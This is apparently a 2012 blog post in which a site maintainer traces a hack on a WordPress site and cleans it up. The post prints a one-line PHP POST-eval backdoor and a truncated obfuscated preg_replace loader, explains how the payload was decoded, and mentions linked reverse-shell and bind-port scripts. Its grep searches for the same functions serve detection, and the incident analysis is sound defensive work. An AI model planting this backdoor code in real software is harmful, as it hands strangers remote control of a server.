title: Hacked Server
date: 2012-08-23 08:23

---

Over the weekend I was informed by a friend that a site I maintain (not mine
personally) was showing up in the Google results as being "malicious". After
many hours of research, I present to you the following story.

I'm writing things down as I fix them, so I'm still not sure where this will end.

* * *

After hearing this news, I Googled the site's name (it is distinctive, but
shall remain nameless) and found that it indeed had been flagged by the Googlebot
as having been hacked.

Short backstory: Recently the owners of the site had undergone some serious flack
from a nameless crowd, and had been flagged by this nameless crowd on the
[Web Of Trust (WOT)](https://www.mywot.com/), a site that warns you of unsafe
websites. The WOT is a really good idea, but this nameless group flagged it not
because it was unsafe, but in retaliation. Because of this, I initially thought
that the warning from Google had set off their alarms, so I didn't take it
too seriously.

But throughout the day I had a nagging feeling, that not all was right with the
world, and so I found myself signing up for something that (now that I've used
it) I think everyone who ever runs a website should be required to
use: [Google Webmasters](http://www.google.com/webmasters/).

Let me take a minute to tell you why you should be using this awesome tool. First,
it will give you the actual HTML output that Google sees. As I found out later,
the hacked website was only displaying spam to the Googlebot, so I never found
it in my other searches. The other reason you should use this tool is because
it will check the status of your installed things (WordPress, etc.) and tell you
when you need to update them. This is incredibly convenient.

Anyway, after I setup the site with Google Webmasters, I found out that the site
was spewing out things that look like this (of course I renamed the links):

> `downing <a href="http://site.com">prescription tramadol without</a>`
> `venlafaxine <a href="http://site.com">penegra generic</a>`

I'm being a little obfuscated with the sites contents, but suffice to say that
this is absolutely not the appropriate content for this site, and at that point
I had to deal with the fact that the server had been compromised.

## The Plan

Typically, evidence of a WordPress hack install is found by searching for the two
PHP functions: [base64_decode](http://php.net/manual/en/function.base64-decode.php),
or [eval](http://php.net/manual/en/function.eval.php). So my initial plan was to
search the server for instances of either of those functions using:

	grep -H -r -i 'base64_decode' ~/sitename.com
	grep -H -r -i 'eval' ~/sitename.com</pre>

* `-H` will print the filename instead of the entire line of text where it found the match
* `-r` will search recursively
* `-i` will ignore case, since PHP ignores it we need to do so to have a thorough search

Doing so brought up quite a few `base64_decode` calls, and many false positives for `eval`
but all of them legitimate. Working with the command line over SSH was difficult, so I
tarred the entire site's contents, minus a copious amount of PDF and MP3 files:

	tar cvzf backup.tgz ~/sitename.com<

Now I have the files in hand, I can very quickly scan through the files and see if
anything catches my eye, and the very first thing I noticed is the file named `wp_info.php`

WordPress has a very particular naming scheme with all their files, and it looks
like this: `word-word.php` So an underscore looks a little suspicious, and opening
it I find this magical bit:

	`eval(stripslashes(array_pop($_POST)));`

That command right there will essentially run _anything_ that is thrown at it by a
POST request. Wow, this is nuts. Also, I don't know why I didn't see it in
the `grep` earlier, but there was probably just too much noise to notice it.

That right there is the likely entry point _after_ the hack, but I want to see
if I can find anything else, so I press on. Even though I am pretty familiar
with the WordPress structure, I downloaded a [fresh WordPress](https://wordpress.org/download/)
install to compare. After browsing around a bit, I found a file in
the `wp-content/uploads` folder named `.cache_tofu.php` that I did not
recognize, and on inspection I found the following at the end of it:

	`preg_replace("/.*/e","x65x76x61x6c ... x3b",".");`

Where the dots are I removed about 24,400 characters from the actual thing. I'm not familiar
with the `preg_replace` function, but the [PHP docs](http://www.php.net/manual/en/function.preg-replace.php)
say it is basically `preg_replace(pattern,replacement,subject)` so the code above will
interpret to just the middle part `"x65x76x61x6c ... x3b"`

But if you'll notice, quite a few characters in that set look like `x##` which is the PHP way of
noting characters in [extended unicode](http://www.php.net/manual/en/regexp.reference.unicode.php), so
all you need to do is figure out a way to convert those to normal ASCII and you can read them.

<sarcasm>Thankfully</sarcasm>, PHP [plays loose](https://maurus.net/resources/programming-languages/php/)
with the encoding, so we can simply turn it to a string and it will print out. But because
PHP plays loose, you can't do something as simple as `echo "x65x76x61x6c ... x3b";` because
it will actually evaluate whatever is there, assuming it's an `eval` statement, which is
an obvious assumption at this point. So here's what you do:

	$myFile = "testFile.txt";
	$fh = fopen($myFile, 'w') or die("can't open file");
	$stringData = "x65x76 ... x20x3b";
	fwrite($fh, $stringData);
	fclose($fh);

With that, I finally got what I was looking for: `eval(gzinflate(base64_decode('5b19fxq30jD8...` which
is the standard hack. And now we can unpack the base64 code to see what magic lies
beneath. Again, it probably has some `eval` in it, so just write it to the text file.
Because it uses `gzinflate` we need to do it this way in our above code:
`$stringData = gzinflate(base64_decode('5b19f...` With that, I get a code that is just
over 1,500 lines long: [pastebin](http://pastebin.com/brR6Jh5f) or [hastebin](http://hastebin.com/hipeqoxoho.php).

It's interesting to note that, even within this code, there are...

My jaw just hit the floor.

Remember, I am writing this as I read it. I just saw this: [http://hastebin.com/jekatesegu.dos](http://hastebin.com/jekatesegu.dos)

I think I need some alcohol to calm my nerves, just a minute...

* * *

Alcohol acquired, still a little shook up, going to press on and hope for the best.

So where was I? Oh, right. It is interesting to note that, even within this code, there
are things that are base64 encoded. I'm going to extract them and see what they say.
It looks like they are Perl scripts, here is one which was labeled `back_connect_p`:
[pastebin](http://pastebin.com/7izktDBV) And here is another which was labeled
`bind_port_p`: [pastebin](http://pastebin.com/7yNrfWT0)

Okay, so this is obviously bad, and in more ways than one: 1) have to look
around for more bad files, 2) based on the script, it would be safe to
assume every password associated with this account (servers, etc.) should
be changed, 3) still don't know how this got run.

Let's start on the last thing first. So we have this absolutely soul crushing code (did you
read it yet? did you understand how bad it was?) but we don't know how it's run. Looking
at the code, I realized that to run it, all you'd have to do is access it. It's located
in the WordPress uploads folder, so we can simply navigate to it at
`site.com/wp-content/uploads/the_nameless_file.php` (hidden the name for now) and we get this:

![Password login of control panel](/content/hacked-server/password.png)

Hmmmm. The alcohol is setting in a bit now, and I am starting to feel less like the world
will end, so I am curious what is behind the password? Looking through the code I find
that all it takes is this: `if(md5($_POST['pass']) == 'dcc2630fea8d91fbc38ee0acc48001a6')`
but an md5 lookup is not trivial for me, so I boot up the old
[virtual computer](http://www.unixmen.com/install-lamp-with-1-command-in-ubuntu-1010-maverick-meerkat/)
and run the code directly. Here is the screenshot:

![Control panel](/content/hacked-server/control-panel.png)

This is terrible.

So here is what we have so far: There is a script on this site that lets a person
pretty much do what they want. The question remains, how did the script get
there in the first place?

Of course, since I don't run the site I am not sure what plugins were installed
before, but I am reasonably certain that the people who own the site wouldn't
install a plugin that didn't come from the [WordPress site](https://wordpress.org/extend/plugins/).
This limits the possible entry points quite a bit.

One weak point in the WP framework shows up if someone changes the folder permissions of one of the
folders. This is addressed quite well in [this](https://codex.wordpress.org/Changing_File_Permissions)
article. But nobody except myself has SSH access, and only one person has FTP access. I'll ask him,
but he seems reasonably smart so he probably wouldn't make the permissions crazy.

In fact, I can check whether a file is executable or not using `ls -ls` and it is
not executable. Furthermore, the file itself was last modified in May this year
(2012), although I don't know how long it's been since it was executed. The site
is hosted on a [shared server space](https://dreamhost.com/), which could
even be the problem.

* * *

At this point I am trying to think of solutions. Since all that's run on this server
is the WordPress install, I can essentially just reinstall the site and verify that
nothing is in the database. The uploads folder can be copied over after I check it.
Being intimately familiar with WordPress I've coached a few people through this
process, and even had to run through it once myself, so I know that it's not too difficult.

Still, the annoyance is huge. And I still don't know what caused the security
breach that allowed that terrible code to get installed.

For tonight I think I have the server locked down enough that I can leave it,
but I think I'll probably reinstall WordPress, it's a pretty fast experience.

## Lesson Learned

You should also look for the `eval` function in Unicode, which looks like `x65x76x61x6c`